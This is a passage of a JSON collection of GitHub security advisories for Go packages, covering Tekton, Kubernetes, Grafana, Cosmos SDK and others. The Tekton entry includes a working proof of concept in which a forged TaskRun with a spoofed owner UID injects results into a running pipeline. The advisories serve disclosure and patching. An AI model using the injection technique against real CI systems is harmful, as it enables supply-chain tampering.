on RBAC is fine and treat update as a privileged role (though we should perhaps update docs to stress this). Create is the most problematic for now. SPIFFE/SPIRE might be able to help with ensuring that only the controller can modify state long term (e.g. sign the expected UIDs?)\n\n### PoC\n\n```yaml\napiVersion: [tekton.dev/v1beta1](http://tekton.dev/v1beta1)\nkind: PipelineRun\nmetadata:\n  name: hello-pr\nspec:\n  pipelineSpec:\n    tasks:\n      - name: task1\n        taskSpec:\n          steps:\n            - name: echo\n              image: [distroless.dev/alpine-base](http://distroless.dev/alpine-base)\n              script: |\n                sleep 60\n      - name: task2\n        runAfter: [task1]\n        taskSpec:\n          steps:\n            - name: echo\n              image: [distroless.dev/alpine-base](http://distroless.dev/alpine-base)\n              script: |\n                echo \"asdf\" > $(results.foo.path)\n          results:\n            - name: foo\n    results:\n      - name: foo\n        value: $(tasks.task2.results.foo)\n```\n\nOnce this is running, grab the PR UID:\n\n```sh\n$ k get pr hello-pr -o json | jq .metadata.uid -r\n```\n\nWhile pipeline is running task 1, start fake task 2:\n\n```yaml\napiVersion: [tekton.dev/v1beta1](http://tekton.dev/v1beta1)\nkind: TaskRun\nmetadata:\n  annotations:\n  labels:\n    [app.kubernetes.io/managed-by](http://app.kubernetes.io/managed-by): tekton-pipelines\n    [tekton.dev/memberOf](http://tekton.dev/memberOf): tasks\n    [tekton.dev/pipeline](http://tekton.dev/pipeline): hello-pr\n    [tekton.dev/pipelineRun](http://tekton.dev/pipelineRun): hello-pr\n    [tekton.dev/pipelineTask](http://tekton.dev/pipelineTask): task2\n  name: hello-pr-task2\n  namespace: default\n  ownerReferences:\n  - apiVersion: [tekton.dev/v1beta1](http://tekton.dev/v1beta1)\n    blockOwnerDeletion: true\n    controller: true\n    kind: PipelineRun\n    name: hello-pr\n    uid: af549647-4532-468b-90c5-29122a408f8d <--- this should be UID of PR fetched in last step\nspec:\n  serviceAccountName: default\n  taskSpec:\n    results:\n    - name: foo\n      type: string\n    steps:\n    - image: [distroless.dev/alpine-base](http://distroless.dev/alpine-base)\n      name: echo\n      resources: {}\n      script: |\n        echo \"zxcv\" > $(results.foo.path)\n```\n\nGet pipeline results - it shows the output of the 2nd injected TaskRun\n\n```\n$ k get pr -o json hello-pr | jq .status.pipelineResults\n[\n  {\n    \"name\": \"foo\",\n    \"value\": \"zxcv\\n\"\n  }\n]\n```\n\n### Impact\n\nThis can be used to trick the Pipeline controller into associating unrelated Runs to the Pipeline, feeding its data through the rest of the Pipeline. This requires access to create TaskRuns, so impact may vary depending on your Tekton setup. **If users already have unrestricted access to create any Task/PipelineRun, this does not grant any additional capabilities**.\n\nWorst case example would be a supply chain attack where a malicious TaskRun triggered from Triggers/Workflows intercepts and replaces a task in a trusted Pipeline.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/tektoncd/pipeline"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.35.0"}, {"last_affected": "0.52.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/tektoncd/pipeline/security/advisories/GHSA-w2h3-vvvq-3m53"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-37264"}, {"type": "PACKAGE", "url": "https://github.com/tektoncd/pipeline"}, {"type": "WEB", "url": "https://github.com/tektoncd/pipeline/blob/2d38f5fa840291395178422d34b36b1bc739e2a2/pkg/reconciler/pipelinerun/pipelinerun.go#L1358-L1372"}, {"type": "WEB", "url": "https://pkg.go.dev/github.com/tektoncd/pipeline/pkg/apis/pipeline/v1beta1#ChildStatusReference"}], "database_specific": {"cwe_ids": ["CWE-345"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2023-07-07T18:46:19Z", "nvd_published_at": "2023-07-07T17:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6hvv-j432-23cv", "modified": "2023-07-14T21:52:09Z", "published": "2023-07-14T21:52:09Z", "aliases": ["CVE-2023-34236"], "summary": "Weave GitOps Terraform Controller Information Disclosure Vulnerability", "details": "### Impact\n\nA vulnerability has been identified in Weave GitOps Terraform Controller which could allow an authenticated remote attacker to view sensitive information. This vulnerability stems from Weave GitOps Terraform Runners (`tf-runner`), where sensitive data is inadvertently printed - potentially revealing sensitive user data in their pod logs. In particular, functions `tfexec.ShowPlan`, `tfexec.ShowPlanRaw`, and `tfexec.Output` are implicated when the `tfexec` object set its `Stdout` and `Stderr` to be `os.Stdout` and `os.Stderr`.\n\nAn unauthorized remote attacker could exploit this vulnerability by accessing these prints of sensitive information, which may contain configurations or tokens that could be used to gain unauthorized control or access to resources managed by the Terraform controller.\n\nA successful exploit could allow the attacker to utilize this sensitive data, potentially leading to unauthorized access or control of the system.\n\n### Patches\n\nThis vulnerability has been addressed in Weave GitOps Terraform Controller versions `v0.14.4` and `v0.15.0-rc.5`. Users are urged to upgrade to one of these versions to mitigate the vulnerability.\n\nThe patches for this vulnerability are found in:\n- this commit: 9708fda28ccd0466cb0a8fd409854ab4d92f7dca\n- this commit: 6323b355bd7f5d2ce85d0244fe0883af3881df4e\n- this commit: 28282bc644054e157c3b9a3d38f1f9551ce09074\n- and this commit: 98a0688036e9dbcf43fa84960d9a1ef3e09a69cf\n\n### Workarounds\n\nAs a temporary measure until the patch can be applied, users can add the environment variable `DISABLE_TF_LOGS` to the tf-runners via the runner pod template of the Terraform Custom Resource. This will prevent the logging of sensitive information and mitigate the risk of this vulnerability.\n\n### References\n\n- The first issue: https://github.com/weaveworks/tf-controller/issues/637\n- The second issue: https://github.com/weaveworks/tf-controller/issues/649\n\n### For More Information\n\nIf you have any further questions or comments about this advisory:\n\nOpen an issue in the Weave GitOps Terraform Controller repository\nEmail us at [security@weave.works](mailto:security@weave.works)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/weaveworks/tf-controller"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.14.4"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/weaveworks/tf-controller"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.15.0-rc.1"}, {"fixed": "0.15.0-rc.5"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/weaveworks/tf-controller/security/advisories/GHSA-6hvv-j432-23cv"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-34236"}, {"type": "WEB", "url": "https://github.com/weaveworks/tf-controller/issues/637"}, {"type": "WEB", "url": "https://github.com/weaveworks/tf-controller/issues/649"}, {"type": "WEB", "url": "https://github.com/weaveworks/tf-controller/commit/28282bc644054e157c3b9a3d38f1f9551ce09074"}, {"type": "WEB", "url": "https://github.com/weaveworks/tf-controller/commit/6323b355bd7f5d2ce85d0244fe0883af3881df4e"}, {"type": "WEB", "url": "https://github.com/weaveworks/tf-controller/commit/9708fda28ccd0466cb0a8fd409854ab4d92f7dca"}, {"type": "WEB", "url": "https://github.com/weaveworks/tf-controller/commit/98a0688036e9dbcf43fa84960d9a1ef3e09a69cf"}, {"type": "PACKAGE", "url": "https://github.com/weaveworks/tf-controller"}], "database_specific": {"cwe_ids": ["CWE-200", "CWE-312", "CWE-522", "CWE-532"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-07-14T21:52:09Z", "nvd_published_at": "2023-07-14T22:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-cgcv-5272-97pr", "modified": "2023-07-07T16:29:50Z", "published": "2023-07-03T21:30:57Z", "aliases": ["CVE-2023-2728"], "summary": "Kubernetes mountable secrets policy bypass", "details": "Users may be able to launch containers that bypass the mountable secrets policy enforced by the ServiceAccount admission plugin when using ephemeral containers. The policy ensures pods running with a service account may only reference secrets specified in the service account\u2019s secrets field. Kubernetes clusters are only affected if the ServiceAccount admission plugin and the `kubernetes.io/enforce-mountable-secrets` annotation are used together with ephemeral containers.\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.27.0"}, {"fixed": "1.27.3"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.26.0"}, {"fixed": "1.26.6"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.25.0"}, {"fixed": "1.25.11"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.24.15"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-2728"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/issues/118640"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/118356"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/118471"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/118473"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/118474"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/118512"}, {"type": "PACKAGE", "url": "https://github.com/kubernetes/kubernetes"}, {"type": "WEB", "url": "https://groups.google.com/g/kubernetes-security-announce/c/vPWYJ_L84m8"}, {"type": "WEB", "url": "http://www.openwall.com/lists/oss-security/2023/07/06/3"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-07-06T15:10:06Z", "nvd_published_at": "2023-07-03T21:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-wm7r-3qxj-5xgq", "modified": "2023-06-09T22:54:42Z", "published": "2023-06-06T21:30:18Z", "withdrawn": "2023-06-09T22:54:42Z", "aliases": [], "summary": "Duplicate Advisory: Grafana Improper Access Control vulnerability", "details": "## Duplicate Advisory\nThis advisory has been withdrawn because it is a duplicate of GHSA-cvm3-pp2j-chr3. This link is maintained to preserve external references.\n\n## Original Description\nGrafana is an open-source platform for monitoring and observability. \n\nThe option to send a test alert is not available from the user panel UI for users having the Viewer role. It is still possible for a user with the Viewer role to send a test alert using the API as the API does not check access to this function.\n\nThis might enable malicious users to abuse the functionality by sending multiple alert messages to e-mail and Slack, spamming users, prepare Phishing attack or block SMTP server.\n\nUsers may upgrade to version 9.5.3, 9.4.12, 9.3.15, 9.2.19 and 8.5.26 to receive a fix.\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/grafana/grafana"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "8.5.26"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/grafana/grafana"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "9.0.0"}, {"fixed": "9.2.19"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/grafana/grafana"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "9.3.0"}, {"fixed": "9.3.15"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/grafana/grafana"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "9.4.0"}, {"fixed": "9.4.12"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/grafana/grafana"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "9.5.0"}, {"fixed": "9.5.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/grafana/bugbounty/security/advisories/GHSA-cvm3-pp2j-chr3"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-2183"}, {"type": "PACKAGE", "url": "https://github.com/grafana/grafana"}, {"type": "WEB", "url": "https://grafana.com/security/security-advisories/cve-2023-2183/"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20230706-0002/"}], "database_specific": {"cwe_ids": ["CWE-284", "CWE-862"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-06-07T15:08:20Z", "nvd_published_at": "2023-06-06T19:15:11Z"}}, {"schema_version": "1.4.0", "id": "GHSA-w5w5-2882-47pc", "modified": "2023-06-30T22:13:02Z", "published": "2023-06-30T22:13:02Z", "aliases": [], "summary": "github.com/cosmos/cosmos-sdk's x/crisis does not charge ConstantFee", "details": "# x/crisis does not charge ConstantFee\n### Impact\nIf a transaction is sent to the `x/crisis` module to check an invariant, the ConstantFee parameter of the chain is NOT charged. All versions of the `x/crisis` module are affected on all versions of the Cosmos SDK.\n\n### Details\nThe `x/crisis` module is supposed to allow anyone to halt a chain in the event of a violated invariant by sending a `MsgVerifyInvariant` with the name of the invariant. Processing this message takes extra processing power hence a `ConstantFee` was introduced on the chain that is charged as extra from the reporter for the extra computational work. This is supposed to avert spammers on the chain making nodes do extra computations using this transaction. By not charging the `ConstantFee`, the transactions related to invariant checking are relatively cheaper compared to the computational need and other transactions.\n\nThat said, the submitter still has to pay the transaction fee to put the transaction on the network, hence using this weakness for spamming is limited by the usual mechanisms.\n\nSynthetic testing showed up to a 20% increase in CPU usage on a validator node that is spammed by hundreds of `MsgVerifyInvariant` messages which still makes this an expensive operation to carry out on a live blockchain network.\n\n### Patches\nThe `ConstantFee` charge of the `x/crisis` module will either be fixed or disabled in an upcoming regular release of the Cosmos SDK.\n\nThe `x/crisis` module was originally intended to allow chains to halt rather than continue with some unknown behavior in the case of an invariant violation (safety over liveness). However, as chains mature, and especially as the potential [cost of halting increases](https://github.com/osmosis-labs/osmosis/issues/570), chains should consider carefully what invariants they really want to halt for, and what invariants are just sort of helpful sanity checks.\n\nThe SDK team is working on new modules that allow chain developers to fine-tune the chain invariants and the necessary actions.\n\nHence, the decision was made that the `x/crisis` module will be deprecated when new modules take over its responsibilities.\n\n### Workarounds\nThere is no workaround posted. Validators are advised to leave some extra computing room on their servers for possible spamming scenarios. (This is a good measure in any case.)\n\n### References\nSDK developer epic about invariant checking: https://github.com/cosmos/cosmos-sdk/issues/15706\n", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cosmos/cosmos-sdk"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "0.50.0-alpha.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-w5w5-2882-47pc"}, {"type": "WEB", "url": "https://github.com/cosmos/cosmos-sdk/issues/15706"}, {"type": "PACKAGE", "url": "https://github.com/cosmos/cosmos-sdk"}], "database_specific": {"cwe_ids": [], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2023-06-30T22:13:02Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-8qxh-2gh8-r923", "modified": "2023-06-12T18:34:26Z", "published": "2023-06-12T18:34:26Z", "aliases": [], "summary": "cheqd-node subject to Cosmos SDK \"Barberry\" vulnerability", "details": "### Impact\nThis [vulnerability dubbed \"Barberry\" affects the Cosmos SDK framework](https://forum.cosmos.network/t/cosmos-sdk-security-advisory-barberry/10825) used by `cheqd-node` as base.\n\nIt impacts the way Cosmos SDK handles vesting accounts, and can therefore be a high-impact vulnerability for any network running the framework.\n\nThere is no vulnerability in the DID/resource modules for `cheqd-node`.\n\n### Patches\nNode operators are requested to upgrade to [cheqd-node v1.4.4](https://github.com/cheqd/cheqd-node/releases/tag/v1.4.4). This is not a state-breaking release and does not require a coordinated upgrade across all node operators.\n\nThis vulnerability was patched in [Cosmos SDK v0.46.13](https://github.com/cosmos/cosmos-sdk/releases/tag/v0.46.13). Since this version switches to Go v1.19 and also changes the namespace of many Cosmos protobuf packages, the Barberry fix was [backported to cheqd's fork of Cosmos SDK](https://github.com/cheqd/cosmos-sdk/releases/tag/v0.46.10-barberry).\n\n### Mitigation\nWhen at least ~**33**% of the voting power of the network has deployed the recommended version of the software, any attack would be unsuccessful but cause a chain halt.\n\nOnce at least ~**67**% of the voting power of the network has deployed recommended version of the software, the attack would be unsuccessful _without_ a chain halt.\n\n### Workarounds\nNo. Node operators are recommended to upgrade to the latest release version.\n\n### References\n- [\"Barberry\" vulnerability security advisory](https://forum.cosmos.network/t/cosmos-sdk-security-advisory-barberry/10825)\n- [Cosmos SDK v0.46.13 release notes](https://github.com/cosmos/cosmos-sdk/releases/tag/v0.46.13)\n", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cheqd/cheqd-node"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.4.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/cheqd/cheqd-node/security/advisories/GHSA-8qxh-2gh8-r923"}, {"type": "WEB", "url": "https://forum.cosmos.network/t/cosmos-sdk-security-advisory-barberry/10825"}, {"type": "PACKAGE", "url": "https://github.com/cheqd/cheqd-node"}, {"type": "WEB", "url": "https://github.com/cosmos/cosmos-sdk/releases/tag/v0.46.13"}], "database_specific": {"cwe_ids": [], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-06-12T18:34:26Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-h65h-v7fw-4p38", "modified": "2023-09-29T16:13:11Z", "published": "2023-06-09T23:23:42Z", "aliases": ["CVE-2019-12291"], "summary": "HashiCorp Consul Incorrect Access Control vulnerability", "details": "HashiCorp Consul 1.4.0 through 1.5.0 has Incorrect Access Control. Keys not matching a specific ACL rule used for prefix matching in a policy can be deleted by a token using that policy even with default deny settings configured.\n\n### Specific Go Packages Affected\ngithub.com/hashicorp/consul/acl", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/consul"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.4.0"}, {"fixed": "1.5.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-12291"}, {"type": "WEB", "url": "https://github.com/hashicorp/consul/issues/5888"}, {"type": "WEB", "url": "https://github.com/hashicorp/consul/commit/36ebca1fd0129278487c6570449bc8cc03987890"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/consul"}, {"type": "WEB", "url": "https://www.hashicorp.com/blog/category/consul"}], "database_specific": {"cwe_ids": ["CWE-284"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-06-09T23:23:42Z", "nvd_published_at": "2019-06-06T17:29:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-455c-vqrf-mghr", "modified": "2023-06-23T21:37:38Z", "published": "2023-06-16T09:30:24Z", "aliases": ["CVE-2023-2783"], "summary": "Mattermost Server Missing Authorization vulnerability", "details": "Mattermost Apps Framework fails to verify that a secret provided in the incoming webhook request allowing an attacker to\u00a0modify the contents of the post sent by the Apps.\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "7.10.0"}, {"fixed": "7.10.1"}]}], "versions": ["7.10.0"]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "7.9.0"}, {"fixed": "7.9.4"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "7.8.5"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-2783"}, {"type": "PACKAGE", "url": "https://github.com/mattermost/mattermost-server"}, {"type": "WEB", "url": "https://mattermost.com/security-updates"}], "database_specific": {"cwe_ids": ["CWE-862"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-06-23T21:37:38Z", "nvd_published_at": "2023-06-16T09:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-rm8v-mxj3-5rmq", "modified": "2023-06-14T17:24:36Z", "published": "2023-06-14T17:24:36Z", "aliases": [], "summary": "github.com/lestrrat-go/jwx vulnerable to Potential Padding Oracle Attack", "details": "### Summary\n\nDecrypting AES-CBC encrypted JWE has Potential Padding Oracle Attack Vulnerability.\n\n### Details\n\nOn [v2.0.10](https://github.com/lestrrat-go/jwx/releases/tag/v2.0.10), decrypting AES-CBC encrypted JWE may return an error \"failed to generate plaintext from decrypted blocks: invalid padding\":\n\nhttps://github.com/lestrrat-go/jwx/blob/8840ffd4afc5839f591ff0e9ba9034af52b1643e/jwe/internal/aescbc/aescbc.go#L210-L213\n\nReporting padding error causes [Padding Oracle Attack](https://en.wikipedia.org/wiki/Padding_oracle_attack) Vulnerability.\nRFC 7516 JSON Web Encryption (JWE) says that we **MUST NOT** do this.\n\n> 11.5.  Timing Attacks\n> To mitigate the attacks described in RFC 3218 [RFC3218], the\n> recipient MUST NOT distinguish between format, padding, and length\n> errors of encrypted keys.  It is strongly recommended, in the event\n> of receiving an improperly formatted key, that the recipient\n> substitute a randomly generated CEK and proceed to the next step, to\n> mitigate timing attacks.\n\nIn addition, the time to remove padding depends on the length of the padding.\nIt may leak the length of the padding by Timing Attacks.\n\nhttps://github.com/lestrrat-go/jwx/blob/796b2a9101cf7e7cb66455e4d97f3c158ee10904/jwe/internal/aescbc/aescbc.go#L33-L66\n\nTo mitigate Timing Attacks, it MUST be done in constant time.\n\n### Impact\n\nThe authentication tag is verified, so it is not an immediate attack.\n", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/lestrrat-go/jwx/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.0.11"}]}], "database_specific": {"last_known_affected_version_range": "<= 2.0.10"}}, {"package": {"ecosystem": "Go", "name": "github.com/lestrrat-go/jwx"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.2.26"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.2.25"}}], "references": [{"type": "WEB", "url": "https://github.com/lestrrat-go/jwx/security/advisories/GHSA-rm8v-mxj3-5rmq"}, {"type": "WEB", "url": "https://github.com/lestrrat-go/jwx/commit/6c41e3822485fc7e11dd70b4b0524b075d66b103"}, {"type": "WEB", "url": "https://github.com/lestrrat-go/jwx/commit/d9ddbc8e5009cfdd8c28413390b67afa7f576dd6"}, {"type": "PACKAGE", "url": "https://github.com/lestrrat-go/jwx"}, {"type": "WEB", "url": "https://github.com/lestrrat-go/jwx/blob/796b2a9101cf7e7cb66455e4d97f3c158ee10904/jwe/internal/aescbc/aescbc.go#L33-L66"}, {"type": "WEB", "url": "https://github.com/lestrrat-go/jwx/blob/8840ffd4afc5839f591ff0e9ba9034af52b1643e/jwe/internal/aescbc/aescbc.go#L210-L213"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-06-14T17:24:36Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-7c94-gvvj-r3mg", "modified": "2023-06-05T20:36:58Z", "published": "2023-06-05T20:36:58Z", "aliases": [], "summary": "cheqd-node affected by Inter-blockchain Communication (IBC) protocol \"Huckleberry\" vulnerability", "details": "### Impact\nThis vulnerability affects the [`ibc-go` package for those running full nodes, dubbed \"Huckleberry\"](https://forum.cosmos.network/t/ibc-security-advisory-huckleberry/10731). According to their advisory:\n\n> This issue is low-severity in general, and it has a low impact and likelihood of exploitation. Depending on how a full node is architected, this issue could potentially yield a high or critical severity vulnerability.\n\nThere is no vulnerability in the DID/resource modules for cheqd-node.\n\n### Patches\nNode operators are requested to upgrade to [cheqd-node v1.4.2](https://github.com/cheqd/cheqd-node/releases/tag/v1.4.2). This is a non-state breaking release, and does not require a coordinated upgrade across all node operators.\n\n### Workarounds\nNo. Node operators are recommended to upgrade to the latest release version.\n\n### References\n- [\"Huckleberry\" IBC security advisory](https://forum.cosmos.network/t/ibc-security-advisory-huckleberry/10731)\n- [`ibc-go` v6.1.1 release notes](https://github.com/cosmos/ibc-go/releases/tag/v6.1.1)\n", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cheqd/cheqd-node"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.4.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/cheqd/cheqd-node/security/advisories/GHSA-7c94-gvvj-r3mg"}, {"type": "WEB", "url": "https://github.com/cheqd/cheqd-node/commit/f325f5f250e150e3e76a5a557669f67b606e34e1"}, {"type": "WEB", "url": "https://forum.cosmos.network/t/ibc-security-advisory-huckleberry/10731"}, {"type": "PACKAGE", "url": "https://github.com/cheqd/cheqd-node"}, {"type": "WEB", "url": "https://github.com/cheqd/cheqd-node/releases/tag/v1.4.2"}, {"type": "WEB", "url": "https://github.com/cosmos/ibc-go/releases/tag/v6.1.1"}], "database_specific": {"cwe_ids": [], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2023-06-05T20:36:58Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-x2w4-c67p-g44j", "modified": "2023-06-07T15:08:08Z", "published": "2023-06-06T21:30:18Z", "aliases": ["CVE-2023-2801"], "summary": "Grafana Missing Synchronization vulnerability", "details": "Grafana is an open-source platform for monitoring and observability. \n\nUsing public dashboards users can query multiple distinct data sources using mixed queries. However such query has a possibility of crashing a Grafana instance.\n\nThe only feature that uses mixed queries at the moment is public dashboards, but it's also possible to cause this by calling the query API directly.\n\nThis might enable malicious users to crash Grafana instances through that endpoint.\n\nUsers may upgrade to version 9.4.12 and 9.5.3 to receive a fix.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/grafana/grafana"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "9.4.12"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/grafana/grafana"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "9.5.0"}, {"fixed": "9.5.3"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-2801"}, {"type": "PACKAGE", "url": "https://github.com/grafana/grafana"}, {"type": "WEB", "url": "https://grafana.com/security/security-advisories/cve-2023-2801/"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20230706-0002/"}], "database_specific": {"cwe_ids": ["CWE-662", "CWE-820"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-06-07T15:08:08Z", "nvd_published_at": "2023-06-06T19:15:11Z"}}, {"schema_version": "1.4.0", "id": "GHSA-7xpv-4pm9-xch2", "modified": "2023-06-02T19:41:31Z", "published": "2023-06-02T19:41:31Z", "aliases": ["CVE-2023-33964"], "summary": "mx-chain-go does not treat invalid transaction with wrong username correctly", "details": "### Impact\nMetachain cannot process a cross-shard miniblock.\nAn invalid transaction with the wrong username on metachain is not treated correctly on the metachain transaction processor. This is strictly a processing issue that could have happened on MultiversX chain. If an error like this had occurred, the metachain would have stopped notarizing blocks from the shard chains. The resuming of notarization is possible only after applying a patched binary version. \n \n### Patches\nIntroduce processIfTxErrorCrossShard for metachain transaction processor. \n\n### Workarounds\nNo\n\n### References\nNo\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/multiversx/mx-chain-go"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.4.16"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/multiversx/mx-chain-go/security/advisories/GHSA-7xpv-4pm9-xch2"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-33964"}, {"type": "WEB", "url": "https://github.com/multiversx/mx-chain-go/commit/97295471465f4b5f79e51b32f8b7111f8d921606"}, {"type": "PACKAGE", "url": "https://github.com/multiversx/mx-chain-go"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-06-02T19:41:31Z", "nvd_published_at": "2023-05-31T18:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-xhg5-42rf-296r", "modified": "2023-06-16T17:53:30Z", "published": "2023-06-06T16:45:29Z", "aliases": ["CVE-2023-33959"], "summary": "notation-go's verification bypass can cause users to verify the wrong artifact", "details": "### Impact\nAn attacker who controls or compromises a registry can lead a user to verify the wrong artifact.\n\n### Patches\nThe problem has been fixed in the release [v1.0.0-rc.6](https://github.com/notaryproject/notation-go/releases/tag/v1.0.0-rc.6). Users should upgrade their notation-go library to [v1.0.0-rc.6](https://github.com/notaryproject/notation-go/releases/tag/v1.0.0-rc.6) or above.\n\n### Workarounds\nUser should use secure and trusted container registries.\n\n### Credits\nThe `notation` project would like to thank Adam Korczynski (@AdamKorcz) for responsibly disclosing the issue found during an security audit (facilitated by OSTIF and sponsored by CNCF) and Shiwei Zhang (@shizhMSFT), 